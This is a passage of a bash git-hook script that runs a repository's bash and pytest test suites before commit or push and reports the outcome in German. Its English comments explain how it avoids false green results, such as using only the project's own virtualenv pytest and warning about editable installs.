  for t in "$REPO"/hooks/tests/test-*.sh; do
    [ -f "$t" ] || continue
    N=$((N+1))
    ( cd "$REPO" && capped bash "$t" ) >/dev/null 2>&1; rc=$?
    if   [ "$rc" -ge 124 ]; then HUNG="${HUNG}$(basename "$t") "
    elif [ "$rc" != 0 ];    then BAD="${BAD}$(basename "$t") "
    fi
  done
  [ "$N" -gt 0 ] || out unavailable "keine Test-Suiten in hooks/tests/"
  [ -z "$HUNG" ] || out unavailable "hängende Suiten (>${CAP}s): $HUNG — nichts bewiesen"
  [ -z "$BAD" ]  || out fail "rote Suiten: $BAD"
  out pass "$N Suiten grün"
fi

# ── python repo (pytest) ──────────────────────────────────────────────────────
# Added 2026-07-30. Until then this file knew Node and our own bash suites and nothing else, so a
# Python project fell through to "kein Test-Aufbau gefunden" — and R09 then blocked every commit
# that claimed a green run. The only way through was an override by hand (testbau-repo:
# "Suite proven by hand: 1836 passed"). A gate whose sole answer is "override me" teaches exactly
# the habit it exists to prevent.
#
# The config is read from the STAGED tree, like everything else here: what this commit writes is
# what decides how the tests run.
#
# KNOWN LIMIT, named rather than half-solved: a repo that carries BOTH a package.json and a pytest
# config never reaches this branch — the JS block above answers first and exits. For a project
# whose package.json only holds a formatter, that answer is "kein test:unit im Repo" while a whole
# pytest suite sits unrun. Handling both would mean deciding which suite the commit belongs to,
# and no such repo exists here yet to decide it against.
PYCFG=""
if grep -q '^\[tool\.pytest' "$REPO/pyproject.toml" 2>/dev/null;      then PYCFG=pyproject.toml
elif [ -f "$REPO/pytest.ini" ];                                        then PYCFG=pytest.ini
elif grep -q '^\[pytest\]' "$REPO/tox.ini" 2>/dev/null;                then PYCFG=tox.ini
elif grep -q '^\[tool:pytest\]' "$REPO/setup.cfg" 2>/dev/null;         then PYCFG=setup.cfg
fi
if [ -n "$PYCFG" ]; then
  # pytest has no import graph to ask "which tests cover these files", the way jest's
  # --findRelatedTests does. Inventing a selection from path names would be a guess dressed as a
  # proof. So the commit says out loud that it deferred — the same answer the bash repo gives.
  [ "$SCOPE" = "commit" ] && out skipped "Python-Repo ($PYCFG): pytest kann die betroffenen Tests nicht gezielt auswählen — die Suite läuft beim Push (pre-push)"

  # The runner comes from the PROJECT'S OWN environment, never from PATH. Same rule as `npx jest`:
  # a pytest from somewhere else runs against somewhere else's packages, and its green would be
  # about a project nobody committed. The venv lives in the REAL repo — it is not in the checkout.
  PYBIN=""
  for c in .venv/bin/pytest venv/bin/pytest; do
    [ -x "$SRC/$c" ] && { PYBIN="$SRC/$c"; break; }
  done
  [ -n "$PYBIN" ] || out unavailable "pytest-Projekt ($PYCFG), aber kein eigener Prüfer in .venv/bin/pytest oder venv/bin/pytest — ein pytest aus dem PATH liefe gegen fremde Pakete und bewiese nichts"

  # `pip install -e .` maps the package name to the WORKING TREE through a finder registered in
  # site-packages. That finder runs before every sys.path entry, so it cannot be pointed at the
  # staged tree — the import wins, whatever the working directory says. It is the same situation
  # as the npm workspace links above, and it gets the same answer: run, and say so in EVERY
  # verdict. A result that is only mostly about this commit must not read like one that is
  # entirely about it.
  # One glob per `ls` call, never two: `ls treffer* fehlt*` exits non-zero because ONE of the two
  # found nothing — the marker was there and the check said no (measured while writing this).
  for d in "$SRC"/.venv/lib/python*/site-packages "$SRC"/venv/lib/python*/site-packages; do
    [ -d "$d" ] || continue
    for m in "$d"/__editable__* "$d"/*.egg-link; do
      [ -e "$m" ] || continue
      WSNOTE="$WSNOTE — ACHTUNG: das Paket ist editierbar installiert (pip install -e), sein Import zeigt auf den ARBEITSBAUM, nicht auf den geprüften Stand"
      break 2
    done
  done

  ( cd "$REPO" && capped "$PYBIN" ) >/dev/null 2>&1
  rc=$?
  [ "$rc" -ge 124 ] && out unavailable "pytest hing (>${CAP}s abgebrochen) — nichts bewiesen"
  # Only 1 means "tests are red". 5 is "nothing collected" and 2/3/4 are interruption, internal
  # error and misuse — all of them GAPS. Broken tooling must never read as broken code.
  case "$rc" in
    0) out pass "pytest-Suite grün ($PYCFG)";;
    1) out fail "pytest-Suite rot";;
    5) out unavailable "pytest hat KEINEN Test eingesammelt — nichts bewiesen";;
    *) out unavailable "pytest brach mit Code $rc ab (kein Testergebnis) — nichts bewiesen";;
  esac
fi

out unavailable "kein Test-Aufbau gefunden (weder package.json noch hooks/tests/ noch pytest)"
